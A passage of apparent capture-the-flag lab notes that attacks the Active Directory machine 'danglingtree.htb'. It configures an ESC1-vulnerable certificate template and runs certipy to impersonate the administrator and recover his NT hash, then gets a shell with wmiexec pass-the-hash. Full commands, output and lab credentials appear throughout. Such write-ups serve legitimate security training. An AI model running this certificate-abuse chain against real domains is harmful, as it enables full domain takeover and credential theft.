Application Policies → Edit → Add:
Client Authentication (1.3.6.1.5.5.7.3.2)
Smart Card Logon (1.3.6.1.4.1.311.20.2.2) — needed for PKINIT

Tab 4 — Security

Add jake.h or Authenticated Users → grant Enroll permission

Tab 5 — Compatibility

Set both to Windows Server 2008 or later (schema version 2, needed for UPN SAN)

The critical one is Subject Name → "Supply in the request" — that's what enables ESC1 and lets you specify administrator@danglingtree.htb as the UPN when requesting.

After saving the template, go back to the CA MMC → Certificate Templates → right-click → New → Certificate Template to Issue → select RemoteAccessVPN.
```

- Tab 2: Subject Name : 
- Select "Supply in the request" ← this is the ESC1 flag (CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT)
	- Uncheck "Use subject information from existing certificates for autoenrollment renewal requests"
![[Pasted image 20260816124741.png]]

- Tab 3: Extensions : 
- Application Policies → Edit → Add:
	- Client Authentication (1.3.6.1.5.5.7.3.2)
	- Smart Card Logon (1.3.6.1.4.1.311.20.2.2) — needed for PKINIT
![[Pasted image 20260816124926.png]]

![[Pasted image 20260816125017.png]]

![[Pasted image 20260816125108.png]]

![[Pasted image 20260816125207.png]]

- Tab 4 : Security :
- Add jake.h or Authenticated Users → grant Enroll permission
![[Pasted image 20260816125452.png]]

- Tab 5: Compatibility :
- Set both to Windows Server 2008 or later (schema version 2, needed for UPN SAN)
	- Certificate recipient Windows 7/ Server 2008 R2 not Vista
	- Note apply is greyed out in picture as I already applied
![[Pasted image 20260816125824.png]]

- After setting it all, we click Apply and then OK.
- NWe should now see our template here:
![[Pasted image 20260816125725.png]]

- The critical one is Subject Name → "Supply in the request" — that's what enables ESC1 and lets you specify administrator@danglingtree.htb as the UPN when requesting.

- After saving the template, go back to the CA MMC → Certificate Templates → right-click → New → Certificate Template to Issue → select RemoteAccessVPN. (I used certipy instead)

- Once we Duplicate template has been created and set up to be vulnerable to ESC1 we cna then pass our certipy exploit to request the administrator certificate:
```
certipy-ad req -u 'jake.h@danglingtree.htb' -p 'Password123!' -dc-ip 10.129.74.221 -target-ip 10.129.74.221 -dc-host 10.129.74.221 -ca danglingtree-DC-CA -template RemoteAccessVPN -upn administrator@danglingtree.htb -sid S-1-5-21-4220238332-57023728-1129110646-500

---OUTPUT---
Certipy v5.1.0 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Request ID is 18
[*] Successfully requested certificate
[*] Got certificate with UPN 'administrator@danglingtree.htb'
[*] Certificate object SID is 'S-1-5-21-4220238332-57023728-1129110646-500'
[*] Saving certificate and private key to 'administrator.pfx'
File 'administrator.pfx' already exists. Overwrite? (y/n - saying no will save with a unique filename): y
[*] Wrote certificate and private key to 'administrator.pfx'
```
![[Pasted image 20260816130039.png]]

- We can then use this to authenticate as the administrator and grab it's hash (remember to use faketime if you haven't synced the clocks):
```
faketime "+7hours" certipy-ad auth -pfx administrator.pfx -dc-ip 10.129.74.221

---OUTPUT---
Certipy v5.1.0 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'administrator@danglingtree.htb'
[*]     SAN URL SID: 'S-1-5-21-4220238332-57023728-1129110646-500'
[*]     Security Extension SID: 'S-1-5-21-4220238332-57023728-1129110646-500'
[*] Using principal: 'administrator@danglingtree.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'administrator.ccache'
File 'administrator.ccache' already exists. Overwrite? (y/n - saying no will save with a unique filename): y
[*] Wrote credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@danglingtree.htb': aad3b435b51404eeaad3b435b51404ee:8cacb3a97e460c65d105ca7cd9913925
```
![[Pasted image 20260816130232.png]]

- We get the Administrator hash as well as the `ccache` file.

- We can now log in to the target with psexec or wmiexec as before as `Administrator` and grab the root flag:
```
wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:8cacb3a97e460c65d105ca7cd9913925 danglingtree.htb/administrator@10.129.74.221

---OUTPUT---
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>
```

![[Pasted image 20260816130432.png]]


---------
### Notes
- `pKIExpirationPeriod` and `pKIOverlapPeriod` values when creating template required us to use bytes.
```
These two attributes aren't stored as plain numbers — AD encodes them as Windows FILETIME-style 64-bit values, specifically as negative 100-nanosecond intervals (relative durations, not absolute timestamps), stored little-endian as an 8-byte octet string. That's fundamentally different from something like pKIMinimalKeySize which is just a plain integer LDAP can store directly as a number.

So bytes([0x00, 0x40, 0x39, 0x87, 0x2E, 0xE1, 0xFE, 0xFF]) isn't an arbitrary magic value — it's the little-endian byte representation of a specific negative 64-bit number.
```

- When creating template I also missed the flag `'msPKI-Template-Minor-Revision'` with the value `1`. This caused an error "Unsupported cert type" which the CA did not support issuing.
- When checking through the GUI I passed the following commands to identify the flag:
```
Get-ADObject -Filter "Name -eq 'EmployeeAuthTemplate'" -SearchBase "CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=danglingtree,DC=htb" -Properties * | Format-List * > C:\Users\Public\newtemplate.txt

Get-ADObject -Filter "Name -eq 'WebServer'" -SearchBase "CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=danglingtree,DC=htb" -Properties * | Format-List * > C:\Users\Public\realtemplate.txt

Compare-Object (Get-Content C:\Users\Public\newtemplate.txt) (Get-Content C:\Users\Public\realtemplate.txt)
```
![[Pasted image 20260814100235.png]]
- We can connect to `jake.h` RDP GUI via the command:
```
xfreerdp3 /u:jake.h /p:'Password123!' /v:10.129.72.173 

--OR--

xfreerdp /u:jake.h /p:'Password123!' /v:10.129.72.173 
```

- Running these commands initially showed the templates that can be issued which did not show the template we created. Even though our bloodyAD and certipy showed it. This is because it was queried through LDAP which showed it but since it was invalid it wasn't showing. So the CA service did not identify it:
```
 certutil -CATemplates -config "dc.danglingtree.htb\danglingtree-DC-CA"
```

- I then set it locally (instead of the script):
```
Set-ADObject -Identity "CN=EmployeeAuthTemplate,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=danglingtree,DC=htb" -Add @{'msPKI-Template-Minor-Revision'=1}
```

- I and then checked the CA issue templates again to find my template confirming it is now working:
![[Pasted image 20260814100407.png]]

